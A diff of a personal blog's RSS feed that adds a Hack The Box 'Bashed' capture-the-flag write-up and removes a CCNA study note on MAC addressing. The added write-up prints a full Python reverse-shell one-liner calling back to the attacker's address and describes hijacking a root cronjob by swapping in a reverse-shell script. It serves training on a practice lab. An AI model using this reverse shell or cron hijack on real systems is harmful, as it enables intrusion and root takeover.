@@ -11,6 +11,75 @@
     <lastBuildDate>Fri, 09 Aug 2024 00:00:00 +0000</lastBuildDate>
     <atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>[HTB] Bashed</title>
+      <link>http://localhost:1313/htb-bashed/</link>
+      <pubDate>Fri, 09 Aug 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
+      <guid>http://localhost:1313/htb-bashed/</guid>
+      <description>nmap scan found that there is one open port, which is the port 80
+Since it was a http server, I navigated to the web page of target ip address.
+I didn&amp;rsquo;t find much interesting information on the web page, so I decided to gather more by using gobuster with the following command:
+gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js,py,html,db,xml,sh,txt
+gobuster found many interesting directories, but the directory, /dev caught my eye because it included this file phpbash.</description>
+      <content:encoded><![CDATA[<p><img src="image.png#center" alt="alt text">
+nmap scan found that there is one open port, which is the port 80</p>
+<br>
+<p><img src="image-1.png#center" alt="alt text">
+Since it was a <strong><em>http</em></strong> server, I navigated to the web page of target ip address.</p>
+<br>
+<p><img src="image-2.png#center" alt="alt text">
+I didn&rsquo;t find much interesting information on the web page, so I decided to gather more by using <strong><em>gobuster</em></strong> with the following command:</p>
+<p><code>gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js,py,html,db,xml,sh,txt</code></p>
+<br>
+<p><img src="image-3.png#center" alt="alt text">
+<strong>gobuster</strong> found many interesting directories, but the directory, <strong><em>/dev</em></strong> caught my eye because it included this file <strong><em>phpbash.php</em></strong> where I could run some bash commands.</p>
+<br>
+<p><img src="image-4.png#center" alt="alt text">
+obtaining the <strong><em>user flag</em></strong> wasn&rsquo;t that hard since I found the <strong><em>phpbash</em></strong>. I just had to navigate to the proper user directory.</p>
+<br>
+<p><img src="image-13.png#center" alt="alt text">
+The problem was gaining the <strong><em>root</em></strong> user access. You guessed it. Time for <strong><em>privilege escalation</em></strong>.</p>
+<br>
+<p><code>python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.51&quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)'</code></p>
+<p>The <strong><em>phpbash</em></strong> was very useful but it was very limited. Therefore, I decided to pop a <strong><em>reverse shell</em></strong> using the python command above.</p>
+<br>
+<p><img src="image-14.png#center" alt="alt text">
+successfully popped the reverse shell.</p>
+<br>
+<p><img src="image-15.png#center" alt="alt text">
+The <code>sudo -l</code> command display a list of commands you are allowed to run with <code>sudo</code>.</p>
+<p><code>(scriptmanager : scriptmanager)</code> means the user can run <code>ALL</code> commands as the user, <strong><em>scriptmanager</em></strong>.</p>
+<br>
+<p><img src="image-16.png#center" alt="alt text">
+after gaining the <code>scriptmanager</code> user shell by running <code>sudo -u scriptmanager /bin/bash</code> command, I explored the directories. I found a suspicious directory, <strong><em>/scripts</em></strong>, there were two files inside it. One is <strong>test.py</strong> and the other is <strong><em>test.txt</em></strong>. As you could see from the screenshot above, the former is owned by <strong><em>scriptmanager</em></strong> and the latter is owned by <strong><em>root</em></strong>.</p>
+<p>The content of the <strong><em>test.py</em></strong> is a python program that writes into <strong><em>test.txt</em></strong> file. Also as you could see from the screenshot above, the date format of the <strong><em>test.txt</em></strong> file is a bit different from the <strong><em>test.py</em></strong> file.</p>
+<br>
+<p><img src="image-17.png#center" alt="alt text">
+running another <code>ls -la</code> command confirmed that my suspicious was true. There exists a <strong><em>cronjob</em></strong> that is scheduled to execute the <strong><em>test.py</em></strong> file and write to the <strong><em>test.txt</em></strong> file.</p>
+<p><strong><em>cronjob</em></strong> is a scheduled task in Unix-like operating systems that is executed automatically at specified intervals. It is widely used for automating repetitive tasks, such as system maintenance, backups, updates, or running scripts.</p>
+<br>
+<p><img src="image-31.png#center" alt="alt text">
+Since I know there exists a cronjob that executes the <strong><em>test.py</em></strong> file, I can replace the file with a <strong><em>python reverse shell</em></strong> code with the same file name. The screenshot above is the code. It is the exact same code I previously had used except I changed the port to 2222 since I was already using the port 1234 to pop the original reverse shell.</p>
+<br>
+<p><img src="image-29.png#center" alt="alt text">
+It&rsquo;s important not to forget to make the file executable.</p>
+<br>
+<p><img src="image-19.png#center" alt="alt text">
+The command starts a simple http server in the directory where the command is executed. This means that any files in that directory will be accessible over HTTP.</p>
+<br>
+<p><img src="image-20.png#center" alt="alt text">
+Back to the <strong>scriptmanager</strong> shell, I removed the original <strong><em>test.py</em></strong> file to replace it over with my file that contains the reverse shell code.</p>
+<br>
+<p><img src="image-30.png#center" alt="alt text">
+Transferred the file over using the <code>wget</code> command.</p>
+<br>
+<p><img src="image-32.png#center" alt="alt text">
+Within a minute (because the cronjob is set to run every minute), I was connected to the root shell and captured the root flag.</p>
+<br>
+<p><img src="image-33.png#center" alt="alt text"></p>
+<br>
+]]></content:encoded>
+    </item>
+    <item>
       <title>[HTB] Optimum</title>
       <link>http://localhost:1313/htb-optimum/</link>
       <pubDate>Fri, 09 Aug 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
@@ -8851,164 +8920,6 @@ SMB default ports are <code>139 or 445</code></p>
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span><span style="color:#fab387">221</span> Goodbye.
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>root@ip-10-10-87-146:~# cat ftp.txt
 </span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>y0u_g0t_th3_ftp_fl4g<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
-]]></content:encoded>
-    </item>
-    <item>
-      <title>[TIL] Life of a Packet</title>
-      <link>http://localhost:1313/til-life-of-a-packet/</link>
-      <pubDate>Mon, 24 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/til-life-of-a-packet/</guid>
-      <description>Today, while studying for my CCNA with Jeremy&amp;rsquo;s IT Lab YouTube videos, I learned something very useful that I can&amp;rsquo;t help but write about because I want to remember it for a long time and make the knowledge mine.
-The image below is the network topology used in the Lab.
-PC1 pings PC4.
-Identify the source/destination MAC address at each specified point in the route to PC4. Identify the MAC address by the device and interface (ie.</description>
-      <content:encoded><![CDATA[<p>Today, while studying for my CCNA with Jeremy&rsquo;s IT Lab YouTube videos, I learned something very useful that I can&rsquo;t help but write about because I want to remember it for a long time and make the knowledge mine.</p>
-<div style="text-align: center"><img src="./pepe-internet.gif"></div>
-<hr>
-<p>The image below is the network topology used in the Lab.</p>
-<div style="text-align: center"><img src="./image15.png"></div>
-<p>PC1 pings PC4.</p>
-<p>Identify the source/destination MAC address at each specified point in the route to PC4.
-Identify the MAC address by the device and interface (ie. the MAC of R1 G0/0)
-</br></p>
-<h5 id="q1-sourcedestination-mac-addresses-at-pc1--sw1-segment">Q1. Source/Destination MAC addresses at PC1 → SW1 segment</h5>
-
-
-
-
-
-
-<pre tabindex="0"><code>Source MAC Address: 1111
-Destination MAC Address: AAAA</code></pre>
-
-
-
-
-
-
-<pre tabindex="0"><code>C:\&gt;ipconfig /all
-
-FastEthernet0 Connection:(default port)
-
-Connection-specific DNS Suffix..:
-Physical Address................: 00D0.BA11.1111
-Link-local IPv6 Address.........: FE80::2D0:BAFF:FEE1:6988
-IPv6 Address....................: ::
-IPv4 Address....................: 192.168.1.1
-Subnet Mask.....................: 255.255.255.0
-Default Gateway.................: ::
-192.168.1.254
-DHCP Servers....................: 0.0.0.0
-DHCPv6 IAID.....................:
-DHCPv6 Client DUID..............: 00-01-00-01-09-99-E5-2C-00-D0-BA-11-11-11
-DNS Servers.....................: ::
-0.0.0.0</code></pre>
-<p>the last four digits of PC1&rsquo;s MAC Address is <code>1111</code> . We are sending a packet from PC1 to PC4, which means the source IP Address is <code>192.168.1.1</code> (PC1&rsquo;s IP Address) and the destination IP Address is <code>192.168.3.1</code> (PC4&rsquo;s IP Address). The source and destination IP Address remain unchanged throughout the communication. Because PC4 is located on a different network, PC1 will encapsulate the packet with an Ethernet header and the destination MAC address will be the MAC address of its <code>default gateway</code>. In this case, it&rsquo;s R1&rsquo;s g0/0 interface. It will be the destination MAC address.</p>
-
-
-
-
-
-
-<pre tabindex="0"><code>R1&gt;enable
-R1#show interfaces g0/0
-GigabitEthernet0/0 is up, line protocol is up (connected)
-Hardware is CN Gigabit Ethernet, address is 0000.01aa.aaaa (bia 00d0.ff77.0101)</code></pre>
-<p>The last four digits of R1&rsquo;s g0/0 interface MAC address is <code>aaaa</code> .</p>
-<div style="text-align: center"><img src="./image16.png"></div>
-<br/>
-<h5 id="q2-sourcedestination-mac-addresses-at-sw1--r1-segment">Q2. Source/Destination MAC addresses at SW1 → R1 segment.</h5>
-
-
-
-
-
-
-<pre tabindex="0"><code>Source MAC Address: 1111
-Destination MAC Address: AAAA</code></pre>
-<p>The Source/Destination MAC addresses at SW1 to R1 segment should be the same as Q1. Switches do not change the source and destination MAC addresses in the frame. It will simply use the source MAC address field in the Ethernet header to learn PC1&rsquo;s MAC address if it doesn&rsquo;t already know it, and then forward the frame to the proper destination, or flood it if it hasn&rsquo;t learned the destination MAC address yet.</p>
-<br/>
-<h5 id="q3-sourcedestination-mac-addresses-at-r1--r2-segment">Q3. Source/Destination MAC addresses at R1 → R2 segment</h5>
-
-
-
-
-
-
-<pre tabindex="0"><code>Source MAC address: BBBB
-Destination MAC address: CCCC</code></pre>
-<p>Like I already mentioned, the source and destination IP addresses will remain the same, as R1 encapsulates the packet with an Ethernet header, it will use the MAC address of its g0/1 interface as the source MAC address and the MAC address of R2&rsquo;s g0/0 interface, which is the next hop in the route, as the destination MAC address.</p>
-<div style="text-align: center"><img src="./image17.png"></div>
-<p>The last four digits of R1&rsquo;s g0/1 interface MAC address is <code>BBBB</code>.</p>
-<div style="text-align: center"><img src="./image18.png"></div>
-<p>The last four digits of R2&rsquo;s g0/0 interface MAC address is <code>CCCC</code>.</p>
-<div style="text-align: center"><img src="./image19.png"></div>
-<p>Here, on Cisco Packet Tracer, we can confirm the source/destination MAC address on the Ethernet header in Layer 2.</p>
-<br/>
-<h5 id="q4-sourcedestination-mac-addresses-at-r2--r3-segment">Q4. Source/Destination MAC addresses at R2 → R3 segment.</h5>
-
-
-
-
-
-
-<pre tabindex="0"><code>Source MAC address: DDDD
-Destination MAC address: EEEE</code></pre>
-<p>The source MAC address will be R2&rsquo;s interface g0/1 and the destination MAC address will be R3&rsquo;s interface g0/0.</p>
-<div style="text-align: center"><img src="./image20.png"></div>
-<p>The last four digits of R2&rsquo;s interface g0/1 MAC address is <code>DDDD</code>.</p>
-<div style="text-align: center"><img src="./image21.png"></div>
-<p>The last four digits of R3&rsquo;s interface g0/0 MAC address is <code>EEEE</code>.</p>
-<div style="text-align: center"><img src="./image22.png"></div>
-<br/>
-<h5 id="q5-e-sourcedestination-mac-addresses-at-r3--sw2-segment">Q5. E. Source/Destination MAC addresses at R3 → SW2 segment.</h5>
-
-
-
-
-
-
-<pre tabindex="0"><code>Source MAC address: FFFF
-Destination MAC address: 4444</code></pre>
-<p>At this point, the destination IP address is part of a network connected to R3, <code>192.168.3.0/24</code> , so R3 knows it can send the packet directly to PC4. So, it will set the destination MAC address to PC4&rsquo;s MAC address, and use its own address as the source.</p>
-<p>The source MAC address will be R3&rsquo;s g0/1 interface, which is <code>FFFF</code> .</p>
-<div style="text-align: center"><img src="./image23.png"></div>
-<p>The destination MAC address will be PC4&rsquo;s MAC address, which turned out to be <code>4444</code> (the last 4 digits).</p>
-
-
-
-
-
-
-<pre tabindex="0"><code>Cisco Packet Tracer PC Command Line 1.0
-C:\&gt;ipconfig /all
-
-FastEthernet0 Connection:(default port)
-
-Connection-specific DNS Suffix..:
-Physical Address................: 000C.8544.4444
-Link-local IPv6 Address.........: FE80::20C:85FF:FEC4:BDB4
-IPv6 Address....................: ::
-IPv4 Address....................: 192.168.3.1
-Subnet Mask.....................: 255.255.255.0
-Default Gateway.................: ::
-192.168.3.254
-DHCP Servers....................: 0.0.0.0
-DHCPv6 IAID.....................:
-DHCPv6 Client DUID..............: 00-01-00-01-2D-AC-7E-D8-00-0C-85-44-44-44
-DNS Servers.....................: ::
-0.0.0.0</code></pre>
-<br/>
-<h5 id="q6-sourcedestination-mac-addresses-at-sw2--pc4-segment">Q6. Source/Destination MAC addresses at SW2 → PC4 segment.</h5>
-
-
-
-
-
-
-<pre tabindex="0"><code>Source MAC address: FFFF
-Destination MAC address: 4444</code></pre>
-<p>The answer for Q6 is the same as Q5 because the SW2 only forwards the frame. The switch does not alter the source or destination MAC addresses in the Ethernet frame. The switch&rsquo;s role is to efficiently forward the frame to the correct destination based on its MAC address table. If it doesn&rsquo;t already know the destination MAC address, it will flood the frame.</p>
 ]]></content:encoded>
     </item>
   </channel>
